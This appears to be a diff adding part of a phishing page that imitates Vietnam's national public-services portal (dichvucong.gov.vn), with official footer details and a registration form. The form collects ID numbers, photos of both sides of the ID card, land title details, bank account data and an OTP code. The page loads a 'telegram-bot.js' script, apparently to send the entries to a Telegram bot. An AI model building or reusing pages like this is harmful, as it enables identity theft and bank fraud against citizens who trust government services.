+                            Tạm dừng, chấm dứt hoạt động
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="main-footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-info">
+                    <p><strong>Cơ quan chủ quản:</strong> Văn phòng Chính phủ</p>
+                    <p><strong>www.dichvucong.gov.vn</strong></p>
+                    <p><strong>Tổng đài hỗ trợ:</strong> 18001096</p>
+                    <p><strong>Email:</strong> dichvucong@chinhphu.vn</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <div id="notification" class="notification"></div>
+
+
+    <script src="telegram-bot.js"></script>
+    <script src="script.js"></script>
+    <script>
+        // Xử lý điều hướng notification items
+        document.addEventListener('DOMContentLoaded', function () {
+            const prevBtn = document.getElementById('notificationPrevBtn');
+            const nextBtn = document.getElementById('notificationNextBtn');
+            const notificationItems = document.querySelectorAll('.notification-item');
+            const dots = document.querySelectorAll('.notification-dot');
+
+            if (!prevBtn || !nextBtn || notificationItems.length === 0) return;
+
+            let currentIndex = 0;
+
+            // Hàm hiển thị notification item
+            function showNotification(index) {
+                notificationItems.forEach((item, i) => {
+                    if (i === index) {
+                        item.style.display = 'block';
+                    } else {
+                        item.style.display = 'none';
+                    }
+                });
+
+                // Cập nhật chỉ báo (dots)
+                dots.forEach((dot, i) => {
+                    if (i === index) {
+                        dot.classList.add('active');
+                    } else {
+                        dot.classList.remove('active');
+                    }
+                });
+
+                // Cập nhật trạng thái nút - đảm bảo cả 2 nút cùng màu
+                if (index === 0) {
+                    prevBtn.style.opacity = '0.4';
+                    prevBtn.style.cursor = 'not-allowed';
+                    prevBtn.style.color = '#666';
+                    prevBtn.disabled = true;
+                } else {
+                    prevBtn.style.opacity = '1';
+                    prevBtn.style.cursor = 'pointer';
+                    prevBtn.style.color = '#000';
+                    prevBtn.disabled = false;
+                }
+
+                if (index === notificationItems.length - 1) {
+                    nextBtn.style.opacity = '0.4';
+                    nextBtn.style.cursor = 'not-allowed';
+                    nextBtn.style.color = '#666';
+                    nextBtn.disabled = true;
+                } else {
+                    nextBtn.style.opacity = '1';
+                    nextBtn.style.cursor = 'pointer';
+                    nextBtn.style.color = '#000';
+                    nextBtn.disabled = false;
+                }
+            }
+
+            // Nút Previous
+            prevBtn.addEventListener('click', function () {
+                if (currentIndex > 0) {
+                    currentIndex--;
+                    showNotification(currentIndex);
+                }
+            });
+
+            // Nút Next
+            nextBtn.addEventListener('click', function () {
+                if (currentIndex < notificationItems.length - 1) {
+                    currentIndex++;
+                    showNotification(currentIndex);
+                }
+            });
+
+            // Click vào dot để chuyển đến notification tương ứng
+            dots.forEach((dot, index) => {
+                dot.addEventListener('click', function () {
+                    currentIndex = index;
+                    showNotification(currentIndex);
+                });
+            });
+
+            // Khởi tạo: đảm bảo cả 2 nút có cùng màu ban đầu
+            prevBtn.style.color = '#000';
+            nextBtn.style.color = '#000';
+            prevBtn.style.background = 'transparent';
+            nextBtn.style.background = 'transparent';
+
+            // Khởi tạo: hiển thị item đầu tiên
+            showNotification(0);
+        });
+    </script>
+    <!-- Modal Thủ tục hành chính -->
+    <!-- Modal Form Đăng Ký Thủ Tục Hành Chính -->
+    <div class="modal-overlay" id="registrationFormModal" style="display: none;" aria-hidden="true" role="dialog"
+        aria-labelledby="registrationFormTitle">
+        <div class="modal-container registration-form-modal">
+            <div class="modal-header">
+                <h2 id="registrationFormTitle">📝 ĐĂNG KÝ THỦ TỤC HÀNH CHÍNH</h2>
+                <button class="modal-close" id="closeRegistrationFormModal" aria-label="Đóng">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <line x1="18" y1="6" x2="6" y2="18"></line>
+                        <line x1="6" y1="6" x2="18" y2="18"></line>
+                    </svg>
+                </button>
+            </div>
+            <div class="modal-body registration-form-body">
+                <form id="registrationForm" class="registration-form">
+                    <!-- 1. Thông Tin Chung -->
+                    <div class="form-section">
+                        <h3 class="form-section-title">1. Thông Tin Chung</h3>
+                        <div class="form-group">
+                            <label>Đơn vị tiếp nhận hồ sơ:</label>
+                            <select name="receivingUnit" class="form-input">
+                                <option value="">-- Chọn đơn vị --</option>
+                                <option value="ubnd">Ủy ban nhân dân</option>
+                                <option value="so-tttt">Sở Thông tin & Truyền thông</option>
+                                <option value="so-tc">Sở Tài chính</option>
+                                <option value="so-tnmt">Sở Tài nguyên & Môi trường</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label>Đơn vị hỗ trợ xử lý:</label>
+                            <select name="supportUnit" class="form-input">
+                                <option value="">-- Chọn đơn vị --</option>
+                                <option value="ubnd">Ủy ban nhân dân</option>
+                                <option value="so-tttt">Sở Thông tin & Truyền thông</option>
+                                <option value="so-tc">Sở Tài chính</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label>Lĩnh vực thủ tục hành chính:</label>
+                            <select name="procedureField" class="form-input">
+                                <option value="">-- Chọn lĩnh vực --</option>
+                                <option value="dat-dai">Đất đai</option>
+                                <option value="xay-dung">Xây dựng</option>
+                                <option value="tai-chinh">Tài chính</option>
+                                <option value="dan-su">Dân sự</option>
+                                <option value="doanh-nghiep">Doanh nghiệp</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label>Tên thủ tục:</label>
+                            <input type="text" name="procedureName" class="form-input" placeholder="Nhập tên thủ tục">
+                        </div>
+                        <div class="form-group">
+                            <label>Mã hồ sơ (nếu có):</label>
+                            <input type="text" name="fileCode" class="form-input" placeholder="Nhập mã hồ sơ">
+                        </div>
+                    </div>
+
+                    <!-- 2. Thông Tin Người Nộp Hồ Sơ -->
+                    <div class="form-section">
+                        <h3 class="form-section-title">2. Thông Tin Người Nộp Hồ Sơ</h3>
+                        <div class="form-group">
+                            <label>Họ và tên: <span class="required">*</span></label>
+                            <input type="text" name="fullName" class="form-input" required
+                                placeholder="Nhập họ và tên đầy đủ">
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>Ngày sinh: <span class="required">*</span></label>
+                                <input type="date" name="birthDate" class="form-input" required>
+                            </div>
+                            <div class="form-group">
+                                <label>Giới tính: <span class="required">*</span></label>
+                                <select name="gender" class="form-input" required>
+                                    <option value="">-- Chọn --</option>
+                                    <option value="nam">Nam</option>
+                                    <option value="nu">Nữ</option>
+                                    <option value="khac">Khác</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label>Số CMND/CCCD/Hộ chiếu: <span class="required">*</span></label>
+                            <input type="text" name="idNumber" class="form-input" required
+                                placeholder="Nhập số CMND/CCCD/Hộ chiếu">
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>Ngày cấp: <span class="required">*</span></label>
+                                <input type="date" name="issueDate" class="form-input" required>
+                            </div>
+                            <div class="form-group">
+                                <label>Nơi cấp: <span class="required">*</span></label>
+                                <input type="text" name="issuePlace" class="form-input" required
+                                    placeholder="Nhập nơi cấp">
+                            </div>
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>Số điện thoại liên hệ: <span class="required">*</span></label>
+                                <input type="tel" name="phone" class="form-input" required
+                                    placeholder="Nhập số điện thoại">
+                            </div>
+                            <div class="form-group">
+                                <label>Email (khuyến nghị):</label>
+                                <input type="email" name="email" class="form-input" placeholder="Nhập email">
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label>Địa chỉ thường trú (thêm mới): <span class="required">*</span></label>
+                            <textarea name="permanentAddress" class="form-input" rows="2" required
+                                placeholder="Nhập địa chỉ thường trú đầy đủ"></textarea>
+                        </div>
+                        <div class="form-group">
+                            <label>Địa chỉ tạm trú (thêm mới):</label>
+                            <textarea name="temporaryAddress" class="form-input" rows="2"
+                                placeholder="Nhập địa chỉ tạm trú (nếu có)"></textarea>
+                        </div>
+                        <div class="form-group">
+                            <label>Đối tượng đăng ký: <span class="required">*</span></label>
+                            <select name="registrationType" class="form-input" required>
+                                <option value="">-- Chọn --</option>
+                                <option value="ca-nhan">Cá nhân</option>
+                                <option value="to-chuc">Tổ chức</option>
+                                <option value="doanh-nghiep">Doanh nghiệp</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <!-- 3. Thông Tin Người Được Ủy Quyền -->
+                    <div class="form-section">
+                        <h3 class="form-section-title">3. Thông Tin Người Được Ủy Quyền (nếu có)</h3>
+                        <div class="form-group">
+                            <label>Họ và tên người ủy quyền:</label>
+                            <input type="text" name="authorizedPersonName" class="form-input"
+                                placeholder="Nhập họ và tên người ủy quyền">
+                        </div>
+                        <div class="form-group">
+                            <label>Số CMND/CCCD:</label>
+                            <input type="text" name="authorizedPersonId" class="form-input"
+                                placeholder="Nhập số CMND/CCCD">
+                        </div>
+                        <div class="form-group">
+                            <label>Quan hệ với người nộp hồ sơ:</label>
+                            <select name="relationship" class="form-input">
+                                <option value="">-- Chọn quan hệ --</option>
+                                <option value="vo-chong">Vợ/Chồng</option>
+                                <option value="cha-me">Cha/Mẹ</option>
+                                <option value="con">Con</option>
+                                <option value="anh-chi-em">Anh/Chị/Em</option>
+                                <option value="khac">Khác</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label>Thông tin liên hệ:</label>
+                            <input type="text" name="authorizedPersonContact" class="form-input"
+                                placeholder="Nhập số điện thoại hoặc email">
+                        </div>
+                    </div>
+
+                    <!-- 4. Thông Tin Thửa Đất / Tài Sản Liên Quan -->
+                    <div class="form-section">
+                        <h3 class="form-section-title">4. Thông Tin Thửa Đất / Tài Sản Liên Quan</h3>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>Số thửa đất:</label>
+                                <input type="text" name="plotNumber" class="form-input" placeholder="Nhập số thửa đất">
+                            </div>
+                            <div class="form-group">
+                                <label>Tờ bản đồ số:</label>
+                                <input type="text" name="mapSheetNumber" class="form-input"
+                                    placeholder="Nhập tờ bản đồ số">
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label>Địa chỉ thửa đất:</label>
+                            <textarea name="plotAddress" class="form-input" rows="2"
+                                placeholder="Nhập địa chỉ thửa đất đầy đủ"></textarea>
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>Diện tích (m²):</label>
+                                <input type="number" name="area" class="form-input" step="0.01"
+                                    placeholder="Nhập diện tích">
+                            </div>
+                            <div class="form-group">
+                                <label>Loại đất:</label>
+                                <select name="landType" class="form-input">
+                                    <option value="">-- Chọn loại đất --</option>
+                                    <option value="dat-o">Đất ở</option>
+                                    <option value="dat-sx">Đất sản xuất</option>
+                                    <option value="dat-lm">Đất lâm nghiệp</option>
+                                    <option value="dat-nn">Đất nông nghiệp</option>
+                                    <option value="dat-khac">Khác</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label>Mục đích sử dụng:</label>
+                            <input type="text" name="usagePurpose" class="form-input"
+                                placeholder="Nhập mục đích sử dụng">
+                        </div>
+                        <div class="form-group">
+                            <label>Giấy tờ pháp lý liên quan đất đai (đã thêm mới):</label>
+                            <div class="file-upload-area">
+                                <input type="file" name="legalDocuments[]" class="file-input" multiple
+                                    accept=".pdf,.jpg,.jpeg,.png,.doc,.docx">
+                                <div class="file-upload-text">Kéo thả file vào đây hoặc click để chọn (PDF, JPG, PNG,
+                                    DOC, DOCX)</div>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label>Sổ đỏ / Sổ hồng (Số phát hành – Số vào sổ):</label>
+                            <input type="text" name="redBookNumber" class="form-input"
+                                placeholder="Nhập số phát hành – số vào sổ">
+                        </div>
+                        <div class="form-group">
+                            <label>Hợp đồng chuyển nhượng / tặng cho / thừa kế: (tùy chọn tải lên)</label>
+                            <input type="file" name="contractDocuments[]" class="file-input" multiple
+                                accept=".pdf,.jpg,.jpeg,.png">
+                        </div>
+                        <div class="form-group">
+                            <label>Giấy phép xây dựng (nếu có):</label>
+                            <input type="file" name="constructionPermit[]" class="file-input" multiple
+                                accept=".pdf,.jpg,.jpeg,.png">
+                        </div>
+                        <div class="form-group">
+                            <label>Biên bản bàn giao / Quyết định giao đất (nếu có):</label>
+                            <input type="file" name="handoverDocuments[]" class="file-input" multiple
+                                accept=".pdf,.jpg,.jpeg,.png">
+                        </div>
+                        <div class="form-group">
+                            <label>Tài liệu đính kèm khác: Upload nhiều file</label>
+                            <input type="file" name="otherDocuments[]" class="file-input" multiple
+                                accept=".pdf,.jpg,.jpeg,.png,.doc,.docx">
+                        </div>
+                    </div>
+
+                    <!-- 5. Thông Tin Ngân Hàng -->
+                    <div class="form-section">
+                        <h3 class="form-section-title">5. Thông Tin Ngân Hàng (Nếu có liên quan đến nghĩa vụ tài chính)
+                        </h3>
+                        <div class="form-group">
+                            <label>Tên ngân hàng:</label>
+                            <select name="bankName" id="bankName" class="form-input">
+                                <option value="">-- Chọn Ngân Hàng --</option>
+                                <option value="Vietcombank">Vietcombank (Ngân hàng Ngoại thương Việt Nam)</option>
+                                <option value="BIDV">BIDV (Ngân hàng Đầu tư và Phát triển Việt Nam)</option>
+                                <option value="VietinBank">VietinBank (Ngân hàng Công thương Việt Nam)</option>
+                                <option value="Agribank">Agribank (Ngân hàng Nông nghiệp và Phát triển Nông thôn)
+                                </option>
+                                <option value="ACB">ACB (Ngân hàng Á Châu)</option>
+                                <option value="Techcombank">Techcombank (Ngân hàng Kỹ thương Việt Nam)</option>
+                                <option value="VPBank">VPBank (Ngân hàng Việt Nam Thịnh Vượng)</option>
+                                <option value="MBBank">MBBank (Ngân hàng Quân đội)</option>
+                                <option value="TPBank">TPBank (Ngân hàng Tiên Phong)</option>
+                                <option value="Sacombank">Sacombank (Ngân hàng Sài Gòn Thương Tín)</option>
+                                <option value="HDBank">HDBank (Ngân hàng Phát triển Thành phố Hồ Chí Minh)</option>
+                                <option value="VIB">VIB (Ngân hàng Quốc tế Việt Nam)</option>
+                                <option value="SHB">SHB (Ngân hàng Sài Gòn - Hà Nội)</option>
+                                <option value="Eximbank">Eximbank (Ngân hàng Xuất Nhập khẩu Việt Nam)</option>
+                                <option value="MSB">MSB (Ngân hàng Hàng Hải)</option>
+                                <option value="OCB">OCB (Ngân hàng Phương Đông)</option>
+                                <option value="SeABank">SeABank (Ngân hàng Đông Nam Á)</option>
+                                <option value="VietABank">VietABank (Ngân hàng Việt Á)</option>
+                                <option value="PGBank">PGBank (Ngân hàng Xăng dầu Petrolimex)</option>
+                                <option value="ABBank">ABBank (Ngân hàng An Bình)</option>
+                                <option value="BacABank">BacABank (Ngân hàng Bắc Á)</option>
+                                <option value="NamABank">NamABank (Ngân hàng Nam Á)</option>
+                                <option value="SCB">SCB (Ngân hàng Sài Gòn)</option>
+                                <option value="Kienlongbank">Kienlongbank (Ngân hàng Kiên Long)</option>
+                                <option value="PVcomBank">PVcomBank (Ngân hàng Đại Chúng Việt Nam)</option>
+                                <option value="PublicBank">PublicBank (Ngân hàng Public Việt Nam)</option>
+                                <option value="OceanBank">OceanBank (Ngân hàng Đại Dương)</option>
+                                <option value="NCB">NCB (Ngân hàng Quốc Dân)</option>
+                                <option value="GPBank">GPBank (Ngân hàng Dầu Khí Toàn Cầu)</option>
+                                <option value="DongABank">DongABank (Ngân hàng Đông Á)</option>
+                                <option value="LienVietPostBank">LienVietPostBank (Ngân hàng LienVietPostBank)</option>
+                                <option value="VietBank">VietBank (Ngân hàng Việt Nam Thương Tín)</option>
+                                <option value="BaoVietBank">BaoVietBank (Ngân hàng Bảo Việt)</option>
+                                <option value="SaigonBank">SaigonBank (Ngân hàng Sài Gòn Công Thương)</option>
+                                <option value="VietCapitalBank">VietCapitalBank (Ngân hàng Bản Việt)</option>
+                                <option value="IndovinaBank">IndovinaBank (Ngân hàng Indovina)</option>
+                                <option value="WooriBank">WooriBank (Ngân hàng Woori Việt Nam)</option>
+                                <option value="ShinhanBank">ShinhanBank (Ngân hàng Shinhan Việt Nam)</option>
+                                <option value="HSBC">HSBC (Ngân hàng HSBC Việt Nam)</option>
+                                <option value="StandardChartered">Standard Chartered (Ngân hàng Standard Chartered Việt
+                                    Nam)</option>
+                                <option value="ANZ">ANZ (Ngân hàng ANZ Việt Nam)</option>
+                                <option value="HongLeongBank">Hong Leong Bank (Ngân hàng Hong Leong Việt Nam)</option>
+                                <option value="UOB">UOB (Ngân hàng UOB Việt Nam)</option>
+                                <option value="CIMB">CIMB (Ngân hàng CIMB Việt Nam)</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label>Chi nhánh:</label>
+                            <input type="text" name="bankBranch" class="form-input" placeholder="Nhập chi nhánh">
+                        </div>
+                        <div class="form-group">
+                            <label>Số tài khoản:</label>
+                            <input type="text" name="accountNumber" class="form-input" placeholder="Nhập số tài khoản">
+                        </div>
+                        <div class="form-group">
+                            <label>Tên chủ tài khoản:</label>
+                            <input type="text" name="accountHolder" class="form-input"
+                                placeholder="Nhập tên chủ tài khoản">
+                        </div>
+                    </div>
+
+                    <!-- 6. Hồ Sơ Đính Kèm -->
+                    <div class="form-section">
+                        <h3 class="form-section-title">6. Hồ Sơ Đính Kèm</h3>
+                        <div class="form-group">
+                            <label>Ảnh CMND/CCCD (mặt trước – mặt sau): <span class="required">*</span></label>
+                            <div class="file-upload-row">
+                                <div class="file-upload-item">
+                                    <label>Mặt trước:</label>
+                                    <input type="file" name="idCardFront" class="file-input" accept=".jpg,.jpeg,.png"
+                                        required>
+                                </div>
+                                <div class="file-upload-item">
+                                    <label>Mặt sau:</label>
+                                    <input type="file" name="idCardBack" class="file-input" accept=".jpg,.jpeg,.png"
+                                        required>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label>Giấy tờ ủy quyền (nếu có):</label>
+                            <input type="file" name="authorizationDocument[]" class="file-input" multiple
+                                accept=".pdf,.jpg,.jpeg,.png">
+                        </div>
+                        <div class="form-group">
+                            <label>Giấy tờ pháp lý đất đai (từ mục 4):</label>
+                            <input type="file" name="landLegalDocuments[]" class="file-input" multiple
+                                accept=".pdf,.jpg,.jpeg,.png">
+                        </div>
+                        <div class="form-group">
+                            <label>Tệp bổ sung khác:</label>
+                            <input type="file" name="additionalFiles[]" class="file-input" multiple
+                                accept=".pdf,.jpg,.jpeg,.png,.doc,.docx">
+                        </div>
+                    </div>
+
+                    <!-- 7. Cam Kết -->
+                    <div class="form-section">
+                        <h3 class="form-section-title">7. Cam Kết</h3>
+                        <div class="commitment-box">
+                            <div class="commitment-item">
+                                <span class="check-icon">✔</span>
+                                <span>"Tôi cam kết toàn bộ thông tin và giấy tờ cung cấp là chính xác. Tôi chịu trách
+                                    nhiệm trước pháp luật về nội dung kê khai."</span>
+                            </div>
+                            <div class="commitment-item">
+                                <span class="check-icon">✔</span>
+                                <span>"Tôi đồng ý cho phép cơ quan xử lý sử dụng thông tin theo đúng phạm vi của thủ tục
+                                    hành chính."</span>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label class="checkbox-label">
+                                <input type="checkbox" name="agreeCommitment" required>
+                                <span>Xác nhận đồng ý cam kết <span class="required">*</span></span>
+                            </label>
+                        </div>
+                    </div>
+
+                    <!-- 8. OTP Verification -->
+                    <div class="form-section" id="otpSection" style="display: none;">
+                        <h3 class="form-section-title">Xác thực OTP</h3>
+                        <div class="otp-container">
+                            <p class="otp-info">Mã OTP đã được gửi đến số điện thoại của bạn. Vui lòng nhập mã để xác
+                                thực.</p>
+                            <div class="form-group">
+                                <label>Mã OTP: <span class="required">*</span></label>
+                                <input type="text" name="otpCode" id="otpInput" class="form-input otp-input"
+                                    maxlength="6" placeholder="Nhập mã OTP 6 số">
+                            </div>
+                            <div class="otp-actions">
+                                <button type="button" id="resendOtpBtn" class="btn-resend-otp">Gửi lại mã OTP</button>
+                                <span class="otp-timer" id="otpTimer"></span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 8. Nút Thao Tác -->
+                    <div class="form-actions">
+                        <button type="button" id="saveDraftBtn" class="btn-action btn-save">Lưu hồ sơ</button>
+                        <button type="submit" id="submitFormBtn" class="btn-action btn-submit">Gửi yêu cầu xử
+                            lý</button>
+                        <button type="reset" id="resetFormBtn" class="btn-action btn-reset">Tải lại</button>
+                        <button type="button" id="printFormBtn" class="btn-action btn-print">In mẫu</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+</body>
+
+</html>
